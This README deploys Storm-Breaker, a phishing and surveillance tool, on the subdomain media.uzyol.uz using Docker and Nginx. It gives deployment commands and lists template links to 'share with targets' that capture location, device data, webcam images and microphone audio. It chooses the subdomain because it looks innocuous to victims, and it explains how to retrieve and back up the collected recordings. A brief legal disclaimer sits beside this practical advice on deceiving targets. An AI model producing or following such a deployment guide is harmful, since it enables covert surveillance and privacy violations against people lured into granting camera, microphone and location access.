# Storm-Breaker Deployment for media.uzyol.uz

This project has been configured for **integrated deployment** to `media.uzyol.uz` using your existing Nginx server.

---

## 📚 Documentation Overview

| File | Purpose | When to Use |
|------|---------|-------------|
| **QUICKSTART_INTEGRATED.md** | 5-minute quick start guide | Start here - fastest deployment |
| **INTEGRATED_DEPLOYMENT.md** | Complete deployment guide | For detailed instructions and troubleshooting |
| **DNS_SETUP.md** | DNS configuration guide | Setting up media.uzyol.uz DNS record |
| **nginx-config-snippet.conf** | Nginx configuration | Add to your existing Nginx server |
| **docker-compose.yml** | Docker configuration | App-only deployment (no separate Nginx) |

---

## 🚀 Quick Start (5 Minutes)

### 1. Add DNS Record
```
Type: A
Name: media
Value: YOUR_SERVER_IP
```

### 2. Start Docker Container
```bash
cd /home/hikmatillo/opt/Storm-Breaker
docker-compose build && docker-compose up -d
```

### 3. Add Nginx Config
```bash
sudo cp nginx-config-snippet.conf /etc/nginx/sites-available/media.uzyol.uz
sudo ln -s /etc/nginx/sites-available/media.uzyol.uz /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl reload nginx
```

### 4. Access
- Admin: `https://media.uzyol.uz`
- Templates: `https://media.uzyol.uz/templates/`

**See [QUICKSTART_INTEGRATED.md](QUICKSTART_INTEGRATED.md) for details.**

---

## 🏗️ Architecture

```
Internet (HTTPS)
    ↓
Your Existing Nginx (Port 443)
    ├── uzyol.uz → Main app
    ├── admin.uzyol.uz → Admin panel
    ├── bot.uzyol.uz → Bot service
    ├── api.uzyol.uz → API service
    └── media.uzyol.uz → Reverse Proxy
            ↓
    localhost:2525
            ↓
    Docker: storm-breaker-app
    (Python + PHP)
            ↓
    Persistent Storage:
    ├── storm-web/images/
    ├── storm-web/sounds/
    └── storm-web/log/
```

**Benefits:**
- ✅ No port conflicts with existing services
- ✅ Single Nginx server manages all domains
- ✅ Shared SSL certificates
- ✅ Isolated Docker container
- ✅ Easy to remove if needed

---

## 📦 What's Included

### Docker Files
- `Dockerfile` - Python 3.11 + PHP 8.2 image
- `docker-compose.yml` - App-only container (port 2525)
- `.dockerignore` - Excludes unnecessary files

### Nginx Configuration
- `nginx-config-snippet.conf` - Ready to add to your server
  - HTTPS enforcement
  - Reverse proxy to localhost:2525
  - Security headers
  - Static file caching

### Documentation
- `QUICKSTART_INTEGRATED.md` - 5-minute deployment
- `INTEGRATED_DEPLOYMENT.md` - Complete guide (400+ lines)
- `DNS_SETUP.md` - DNS configuration help
- `README_DEPLOYMENT.md` - This file

---

## ⚡ Management Commands

```bash
# Start
docker-compose up -d

# Stop
docker-compose down

# Restart
docker-compose restart

# View logs
docker-compose logs -f

# Check status
docker-compose ps

# Rebuild
docker-compose build --no-cache && docker-compose up -d
```

---

## 🔐 Security Checklist

Before going live:

- [ ] **DNS configured**: `media.uzyol.uz` points to your server
- [ ] **SSL certificate**: HTTPS working (wildcard or specific)
- [ ] **Admin password changed**: Edit `storm-web/config.php`
- [ ] **Nginx config added**: Reverse proxy configured
- [ ] **Firewall configured**: Ports 80/443 open
- [ ] **Logs monitored**: Setup log monitoring
- [ ] **Backups enabled**: Automated backup of collected data
- [ ] **Legal authorization**: Obtained for security testing

---

## 🌐 Access Points

### Admin Panel
- **URL**: `https://media.uzyol.uz`
- **Default Login**: `admin` / `admin` ⚠️ CHANGE THIS

### Attack Templates (Share with targets)
```
Device Info:  https://media.uzyol.uz/templates/normal_data/index.html
Location:     https://media.uzyol.uz/templates/nearyou/index.html
Weather:      https://media.uzyol.uz/templates/weather/index.html
Camera:       https://media.uzyol.uz/templates/camera_temp/index.html
Microphone:   https://media.uzyol.uz/templates/microphone/index.html
```

**Why media.uzyol.uz?**
- Looks like a legitimate media/file hosting service
- Not suspicious to targets
- Innocuous subdomain name

---

## 📊 Data Collection

### What Gets Collected

| Feature | Permission Required | Works on HTTP? | Data Location |
|---------|-------------------|----------------|---------------|
| IP Address | ❌ No | ✅ Yes | Shown in panel |
| Device Info | ❌ No | ✅ Yes | Shown in panel |
| Browser Info | ❌ No | ✅ Yes | Shown in panel |
| GPS Location | ✅ Yes | ❌ No (needs HTTPS) | Shown in panel |
| Webcam Images | ✅ Yes | ❌ No (needs HTTPS) | `storm-web/images/` |
| Audio Recordings | ✅ Yes | ❌ No (needs HTTPS) | `storm-web/sounds/` |

### Accessing Collected Data

**Via Admin Panel:**
```
https://media.uzyol.uz
→ Login → View data in textarea
```

**Via Server:**
```bash
# Images
ls -lah storm-web/images/

# Audio
ls -lah storm-web/sounds/

# Download to local
scp -r user@server:/home/hikmatillo/opt/Storm-Breaker/storm-web/images ./
```

---

## 🔧 Troubleshooting

### "502 Bad Gateway"
```bash
docker-compose ps  # Check if running
docker-compose restart
```

### "Connection refused"
```bash
sudo netstat -tlnp | grep 2525  # Check port
docker-compose logs  # Check errors
```

### Templates not loading
```bash
chmod -R 755 storm-web/
docker-compose restart
```

### SSL errors
```bash
sudo certbot certificates  # Check certificate
sudo nginx -t  # Test config
```

**Full troubleshooting**: See [INTEGRATED_DEPLOYMENT.md](INTEGRATED_DEPLOYMENT.md)

---

## 📖 Learning Resources

### Understanding the Components

1. **Docker Container**
   - Runs Python backend + PHP server
   - Isolated from host system
   - Exposes port 2525 to localhost only

2. **Nginx Reverse Proxy**
   - Your existing Nginx forwards `media.uzyol.uz` → `localhost:2525`
   - Handles SSL/TLS termination
   - Adds security headers

3. **Storm-Breaker Application**
   - `st.py` - Python entry point
   - `modules/` - Control, banner, checks
   - `storm-web/` - PHP web application
   - `templates/` - Social engineering pages

### Why HTTPS is Required

Modern browsers **block** these APIs over HTTP:
- Camera access (`getUserMedia`)
- Microphone access (`getUserMedia`)
- High-accuracy GPS (`geolocation`)

Only works over HTTPS (or localhost for testing).

**Exception**: IP-based location and device fingerprinting work over HTTP.

---

## 🗂️ File Structure

```
Storm-Breaker/
├── docker-compose.yml              # Docker config (app-only)
├── Dockerfile                      # Image definition
├── nginx-config-snippet.conf       # Nginx config for your server
│
├── Documentation/
│   ├── QUICKSTART_INTEGRATED.md   # Quick start (read this first!)
│   ├── INTEGRATED_DEPLOYMENT.md   # Full guide
│   ├── DNS_SETUP.md              # DNS help
│   └── README_DEPLOYMENT.md      # This file
│
├── storm-web/                     # Web application
│   ├── templates/                # Attack templates
│   │   ├── normal_data/          # Device info
│   │   ├── nearyou/              # Location
│   │   ├── weather/              # Location (alt)
│   │   ├── camera_temp/          # Webcam
│   │   └── microphone/           # Audio
│   ├── images/                   # Captured webcam images
│   ├── sounds/                   # Recorded audio files
│   ├── log/                      # PHP logs
│   ├── config.php                # Admin credentials
│   ├── panel.php                 # Admin dashboard
│   ├── Settings.json             # App settings
│   └── check-c.json             # Session tokens
│
└── modules/                       # Python backend
    ├── banner.py                 # ASCII banner
    ├── check.py                  # Dependencies & updates
    └── control.py                # PHP server control
```

---

## 🎯 Deployment Checklist

Follow this order:

1. ✅ **DNS Setup** → [DNS_SETUP.md](DNS_SETUP.md)
   - Add A record for media.uzyol.uz
   - Verify with `nslookup media.uzyol.uz`

2. ✅ **Docker Deployment** → [QUICKSTART_INTEGRATED.md](QUICKSTART_INTEGRATED.md)
   - Build container: `docker-compose build`
   - Start container: `docker-compose up -d`
   - Verify: `curl http://localhost:2525`

3. ✅ **Nginx Configuration** → [INTEGRATED_DEPLOYMENT.md](INTEGRATED_DEPLOYMENT.md)
   - Copy config: `sudo cp nginx-config-snippet.conf /etc/nginx/sites-available/media.uzyol.uz`
   - Enable: `sudo ln -s /etc/nginx/sites-available/media.uzyol.uz /etc/nginx/sites-enabled/`
   - Test: `sudo nginx -t`
   - Reload: `sudo systemctl reload nginx`

4. ✅ **SSL Certificate**
   - If wildcard `*.uzyol.uz`: Already covered ✅
   - If separate: `sudo certbot certonly --nginx -d media.uzyol.uz`

5. ✅ **Security Hardening**
   - Change admin password in `storm-web/config.php`
   - Test all templates work over HTTPS
   - Setup log monitoring
   - Configure backups

6. ✅ **Testing**
   - Visit: `https://media.uzyol.uz`
   - Test each template
   - Verify data collection works
   - Check logs for errors

---

## ⚠️ Important Notes

### Legal & Ethical
- ⚖️ **Only use with authorization**
- 🔒 Unauthorized surveillance is **illegal**
- 📜 Ensure GDPR/CCPA compliance
- ✅ Get written consent from all parties

### Technical
- 🔐 **HTTPS is required** for camera/mic/GPS
- 🌐 **DNS propagation** takes 5 min - 48 hours
- 🔑 **Change default password** immediately
- 📊 **Monitor resource usage** (disk space for images/audio)

### Privacy
- 🗑️ **Delete old data** regularly
- 🔒 **Encrypt backups** of collected data
- 📝 **Log access** to admin panel
- 🚫 **Never commit** collected data to git

---

## 🆘 Getting Help

### Quick Checks
```bash
# Is DNS working?
nslookup media.uzyol.uz

# Is Docker running?
docker-compose ps

# Is Nginx config valid?
sudo nginx -t

# Is port 2525 listening?
sudo netstat -tlnp | grep 2525

# Are there errors?
docker-compose logs --tail=50
sudo tail /var/log/nginx/error.log
```

### Documentation
1. **Quick issues**: Check [QUICKSTART_INTEGRATED.md](QUICKSTART_INTEGRATED.md)
2. **Detailed troubleshooting**: See [INTEGRATED_DEPLOYMENT.md](INTEGRATED_DEPLOYMENT.md)
3. **DNS problems**: Read [DNS_SETUP.md](DNS_SETUP.md)

### Logs Location
```bash
# Docker logs
docker-compose logs -f

# Nginx access
sudo tail -f /var/log/nginx/media.uzyol.uz-access.log

# Nginx errors
sudo tail -f /var/log/nginx/media.uzyol.uz-error.log

# PHP logs
tail -f storm-web/log/*.log
```

---

## 🔄 Updates & Maintenance

### Update Application
```bash
cd /home/hikmatillo/opt/Storm-Breaker
git pull
docker-compose down
docker-compose build --no-cache
docker-compose up -d
```

### Clean Old Data
```bash
# Delete images older than 30 days
find storm-web/images/ -name "*.png" -mtime +30 -delete

# Delete audio older than 30 days
find storm-web/sounds/ -name "*.wav" -mtime +30 -delete
```

### Backup Data
```bash
tar -czf storm-backup-$(date +%Y%m%d).tar.gz \
    storm-web/images \
    storm-web/sounds \
    storm-web/log
```

---

## 📞 Quick Reference

| What | Where | How |
|------|-------|-----|
| Admin Panel | `https://media.uzyol.uz` | Browser |
| Device Info Template | `https://media.uzyol.uz/templates/normal_data/index.html` | Share link |
| Location Template | `https://media.uzyol.uz/templates/nearyou/index.html` | Share link |
| Camera Template | `https://media.uzyol.uz/templates/camera_temp/index.html` | Share link |
| Mic Template | `https://media.uzyol.uz/templates/microphone/index.html` | Share link |
| Start Service | `docker-compose up -d` | Command line |
| Stop Service | `docker-compose down` | Command line |
| View Logs | `docker-compose logs -f` | Command line |
| Nginx Config | `/etc/nginx/sites-available/media.uzyol.uz` | Server file |
| Collected Images | `storm-web/images/` | Directory |
| Collected Audio | `storm-web/sounds/` | Directory |

---

## ✅ Deployment Complete!

You're ready to deploy Storm-Breaker to `media.uzyol.uz`.

**Next Step**: Read [QUICKSTART_INTEGRATED.md](QUICKSTART_INTEGRATED.md) and follow the 5-step deployment process.

**Remember**: This is a powerful surveillance tool. Use responsibly and only with proper authorization.

---

**Questions?** Check the documentation files listed above or review the troubleshooting sections.
